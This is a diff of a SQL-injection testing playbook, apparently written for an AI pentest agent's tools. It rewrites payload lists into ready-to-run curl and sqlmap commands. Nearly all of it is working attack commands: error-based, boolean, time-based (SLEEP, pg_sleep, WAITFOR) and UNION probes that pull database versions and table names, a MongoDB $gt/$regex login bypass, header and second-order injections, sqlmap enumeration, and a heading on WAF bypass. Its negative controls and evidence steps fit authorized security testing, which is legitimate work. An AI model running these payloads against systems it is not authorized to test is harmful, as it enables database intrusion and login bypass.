@@ -24,80 +24,90 @@ Map all input vectors on the endpoint:
 
 For each, record the expected type (integer, string, date, boolean, array, JSON object).
 
-### 2. Error-based detection (fastest signal)
+### 2. Positive control — baseline request
 
-Inject type-breaking values and observe:
 ```
-Original: id=1        → 200, normal response (baseline)
-Probe 1:  id=1'       → 500/error/different response = string context
-Probe 2:  id=1"       → same check for double-quote context
-Probe 3:  id=1\       → backslash escape check
-Probe 4:  id=1)       → parenthesis context
-Probe 5:  id=1' OR '1'='1  → true condition, compare with baseline
-Probe 6:  id=1' OR '1'='2  → false condition, must differ from probe 5
+cyber_process argv=["curl","-sS","-D","-","-o","baseline.html","-w","status:%{http_code} size:%{size_download} time:%{time_total}","<url>/endpoint?id=1"]
 ```
 
-**Differential test**: probe 5 (true) and probe 6 (false) MUST produce different responses. Same response = not injectable. Record each as an observation.
+Record status, body size, response time. Hash the body. This is the functional baseline.
 
-### 3. Blind boolean detection
+### 3. Error-based detection
 
-When error-based shows no visible error but differential exists:
 ```
-True:  id=1 AND 1=1   → normal response
-False: id=1 AND 1=2   → different response (empty, fewer rows, different length)
-```
-
-Measure: response length, word count, specific content presence. Use `diff-control.py --seuil-ms` for timing if responses are identical in content.
-
-### 4. Blind time-based detection
-
-When boolean blind is inconclusive:
-```
-Baseline:  id=1                          → measure response time (3 samples, median)
-Payload:   id=1; WAITFOR DELAY '0:0:5'  → MSSQL
-           id=1' AND SLEEP(5)-- -        → MySQL
-           id=1'; SELECT pg_sleep(5)-- - → PostgreSQL
-           id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -  → MySQL subquery
+cyber_process argv=["curl","-sS","-D","-","-o","probe-sq.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1%27"]
+cyber_process argv=["curl","-sS","-D","-","-o","probe-dq.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1%22"]
+cyber_process argv=["curl","-sS","-D","-","-o","probe-bs.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1%5C"]
+cyber_process argv=["curl","-sS","-D","-","-o","probe-paren.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1)"]
 ```
 
-Confirmation: 3 consecutive runs with consistent delay > 4 seconds above baseline median. One sample is never proof.
+Compare each against baseline. Status change, body size change, or SQL error string (`syntax error`, `unclosed quotation`, `ORA-`, `PG::`) = injection signal.
 
-### 5. UNION-based extraction (after injection confirmed)
+### 4. Differential boolean — true vs false
 
-1. Determine column count:
-   ```
-   id=1 ORDER BY 1-- -     → OK
-   id=1 ORDER BY 2-- -     → OK
-   ...
-   id=1 ORDER BY N+1-- -   → error → N columns
-   ```
+```
+cyber_process argv=["curl","-sS","-D","-","-o","diff-true.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1'+OR+'1'%3d'1"]
+cyber_process argv=["curl","-sS","-D","-","-o","diff-false.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1'+OR+'1'%3d'2"]
+```
 
-2. Find displayable column:
-   ```
-   id=-1 UNION SELECT 1,2,...,N-- -  → which number appears in response
-   ```
+**Differential test**: true and false MUST produce different responses (body size, content, status). Same response = not injectable. Hash both bodies.
 
-3. Extract proof (stop here — bounded extraction):
-   ```
-   id=-1 UNION SELECT 1,@@version,3,...,N-- -          → MySQL version
-   id=-1 UNION SELECT 1,version(),3,...,N-- -           → PostgreSQL version
-   id=-1 UNION SELECT 1,@@servername,3,...,N-- -        → MSSQL hostname
-   id=-1 UNION SELECT 1,table_name,3 FROM information_schema.tables LIMIT 1-- -
-   ```
+For integer context (no quotes):
 
-### 6. sqlmap automation (after manual confirmation)
+```
+cyber_process argv=["curl","-sS","-D","-","-o","diff-int-true.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1+AND+1%3d1"]
+cyber_process argv=["curl","-sS","-D","-","-o","diff-int-false.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1+AND+1%3d2"]
+```
 
-Only after manual confirmation of injection:
-```bash
-sqlmap -u "https://target/endpoint?id=1" \
-  --batch --risk=1 --level=3 \
-  --technique=BEUST \
-  --dbms=<detected> \
-  --threads=1 \
-  --tamper=<if-waf> \
-  --banner --current-db --current-user \
-  --tables --stop 1 \
-  --output-dir=<evidence-dir>/sqlmap
+### 5. Blind time-based detection
+
+Three samples for baseline, three for payload:
+
+```
+cyber_process argv=["curl","-sS","-o","/dev/null","-w","time:%{time_total}","<url>/endpoint?id=1"]
+cyber_process argv=["curl","-sS","-o","/dev/null","-w","time:%{time_total}","<url>/endpoint?id=1'+AND+SLEEP(5)--+-"]
+```
+
+MySQL variant. For PostgreSQL:
+
+```
+cyber_process argv=["curl","-sS","-o","/dev/null","-w","time:%{time_total}","<url>/endpoint?id=1';SELECT+pg_sleep(5)--+-"]
+```
+
+For MSSQL:
+
+```
+cyber_process argv=["curl","-sS","-o","/dev/null","-w","time:%{time_total}","<url>/endpoint?id=1';WAITFOR+DELAY+'0:0:5'--+-"]
+```
+
+Confirmation: 3 consecutive runs with consistent delay > 4s above baseline median. One sample is never proof.
+
+### 6. UNION-based extraction
+
+Column count via ORDER BY:
+
+```
+cyber_process argv=["curl","-sS","-D","-","-w","status:%{http_code}","<url>/endpoint?id=1+ORDER+BY+5--+-"]
+cyber_process argv=["curl","-sS","-D","-","-w","status:%{http_code}","<url>/endpoint?id=1+ORDER+BY+6--+-"]
+```
+
+Find displayable column:
+
+```
+cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?id=-1+UNION+SELECT+1,2,3,4,5--+-"]
+```
+
+Extract proof (stop at version + one table):
+
+```
+cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?id=-1+UNION+SELECT+1,@@version,3,4,5--+-"]
+cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?id=-1+UNION+SELECT+1,table_name,3,4,5+FROM+information_schema.tables+LIMIT+1--+-"]
+```
+
+### 7. sqlmap automation (after manual confirmation only)
+
+```
+cyber_process argv=["sqlmap","-u","<url>/endpoint?id=1","--batch","--risk=1","--level=3","--technique=BEUST","--dbms=<detected>","--threads=1","--banner","--current-db","--current-user","--tables","--stop","1","--output-dir=<evidence-dir>/sqlmap"]
 ```
 
 Tamper scripts by WAF:
@@ -111,48 +121,82 @@ Tamper scripts by WAF:
 
 Record the sqlmap output directory as an observation.
 
-### 7. Special injection contexts
+### 8. Special injection contexts
 
-**JSON injection:**
-```json
-{"id": "1' OR '1'='1", "name": "test"}
+**JSON body injection:**
+
+```
+cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-d","{\"id\":\"1' OR '1'='1\",\"name\":\"test\"}","<url>/api/endpoint"]
+cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-d","{\"id\":\"1' OR '1'='2\",\"name\":\"test\"}","<url>/api/endpoint"]
 ```
 
-**GraphQL injection:**
-```graphql
-query { user(id: "1' OR '1'='1") { name } }
+**GraphQL variable injection:**
+
+```
+cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-d","{\"query\":\"query { user(id: \\\"1' OR '1'='1\\\") { name } }\"}","<url>/graphql"]
 ```
 
-**NoSQL (MongoDB):**
-```json
-{"username": {"$gt": ""}, "password": {"$gt": ""}}
-{"username": {"$regex": "^a"}, "password": {"$gt": ""}}
-```
+**NoSQL operator injection (MongoDB):**
 
-**Second-order:** inject in registration/profile → check in admin panel/export/email. Store the injection point observation, then the trigger observation separately.
+```
+cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-d","{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}","<url>/api/login"]
+cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-d","{\"username\":\"admin\",\"password\":{\"$regex\":\"^.\"}}","<url>/api/login"]
+```
 
 **Header injection:**
+
 ```
-X-Forwarded-For: 1' OR '1'='1
-Cookie: session=x; lang=en' AND SLEEP(5)-- -
-Referer: https://target/' OR '1'='1
+cyber_process argv=["curl","-sS","-D","-","-o","/dev/null","-w","time:%{time_total}","-H","X-Forwarded-For: 1' AND SLEEP(5)-- -","<url>/endpoint"]
+cyber_process argv=["curl","-sS","-D","-","-H","Referer: https://target/' OR '1'='1","<url>/endpoint"]
 ```
 
-### 8. Negative controls
+**Second-order:** inject in registration, then check in admin/export:
 
-For each confirmed injection:
-- Control 1: original value → normal response = positive control.
-- Control 2: safe string with no SQL meaning (e.g., `id=AAAA`) → no SQL behavior = negative.
-- Control 3: same payload on a parameter known to not be injectable → no effect.
-- Control 4: for time-based, same query with `SLEEP(0)` → no delay.
+```
+cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-d","{\"username\":\"test'||(SELECT 1 FROM dual)||'\",\"password\":\"test123\"}","<url>/api/register"]
+cyber_process argv=["curl","-sS","-D","-","-H","Cookie: <admin-session>","<url>/admin/users/export"]
+```
 
-### 9. Evidence assembly
+### 9. Negative controls
+
+```
+cyber_process argv=["curl","-sS","-D","-","-o","ctrl-baseline.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1"]
+cyber_process argv=["curl","-sS","-D","-","-o","ctrl-safe.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=AAAA"]
+cyber_process argv=["curl","-sS","-D","-","-o","ctrl-other-param.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1&safe_param=1'+OR+'1'%3d'1"]
+cyber_process argv=["curl","-sS","-o","/dev/null","-w","time:%{time_total}","<url>/endpoint?id=1'+AND+SLEEP(0)--+-"]
+```
+
+| Control | Description | Expected |
+|---|---|---|
+| Baseline | original value `id=1` | normal 200, baseline body |
+| Safe string | `id=AAAA` (no SQL meaning) | error or empty, no SQL behavior |
+| Non-injectable param | payload on `safe_param` | no SQL effect |
+| `SLEEP(0)` | zero-delay control for time-based | no delay (matches baseline timing) |
+
+### 10. Evidence assembly
 
 `cyber_finding` with:
-- `evidence`: baseline + error probes + true/false differential + extraction proof + sqlmap output + all negative controls
+- `evidence`: baseline + error probes + true/false differential + extraction proof + sqlmap output + all 4 negative controls
 - `sources`: the response diff showing the differential behavior
-- `checks`: baseline:positive-control, true-condition:reproduction, false-condition:negative-control, safe-string:negative-control
+- `checks`: baseline:positive-control, true-condition:reproduction, false-condition:negative-control, safe-string:negative-control, SLEEP(0):timing-control
 - `impact`: database type + version + current user + privilege level (DBA? file read? OS command?)
+
+## Verification scenarios
+
+| Scenario | Observation | Expected classification |
+|---|---|---|
+| `id=1'` returns SQL error string | `syntax error` / `ORA-` / `PG::` in body | error-based SQLi candidate |
+| `id=1'` returns same 200 as baseline | identical body | not error-based |
+| True vs false differential: different body size | >10% difference | boolean blind SQLi candidate |
+| True vs false: identical response | same size + same hash | not injectable |
+| `SLEEP(5)` adds >4s consistently, 3 samples | 3x time_total > baseline+4s | time-based blind SQLi candidate |
+| `SLEEP(0)` matches baseline timing | normal time_total | timing control confirmed |
+| UNION extraction returns `@@version` | version string in body | UNION SQLi confirmed |
+| `sqlmap --banner` succeeds after manual confirm | banner + current-db in output | sqlmap confirmation |
+| NoSQL `$gt` returns all users | body contains multiple records | NoSQL injection candidate |
+| NoSQL `$gt` returns only requested user | single record | not NoSQL injectable |
+| Header `SLEEP(5)` causes delay | time_total > baseline+4s | header injection candidate |
+| Second-order: injected value triggers in export | SQL output in export body | second-order candidate |
 
 ### WAF bypass protocol
 
